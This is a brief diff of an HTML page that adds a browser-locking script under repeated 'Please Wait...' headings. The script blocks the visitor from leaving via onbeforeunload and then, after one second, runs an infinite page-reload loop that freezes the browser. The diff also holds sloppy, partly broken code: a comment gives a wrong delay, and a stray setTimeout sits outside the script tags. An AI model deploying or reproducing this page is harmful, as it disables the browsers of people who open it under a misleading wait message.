@@ -1,5 +1,11 @@
-<script>onbeforeunload = () => true;
+<h1>Please Wait... </h1><h1>Please Wait... </h1><h1>Please Wait... </h1><h1>Please Wait... </h1><h1>Please Wait... </h1><h1>Please Wait...</h1>
+<script>
+onbeforeunload = () => true;
+var delayInMilliseconds = 5072; //1 second
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)</script>
 
-setTimeout(function(){
-  while(1)location.reload(1)
-}, 1000)</script>
+setTimeout(function() {
+  //your code to be executed after 1 second
+}, delayInMilliseconds);
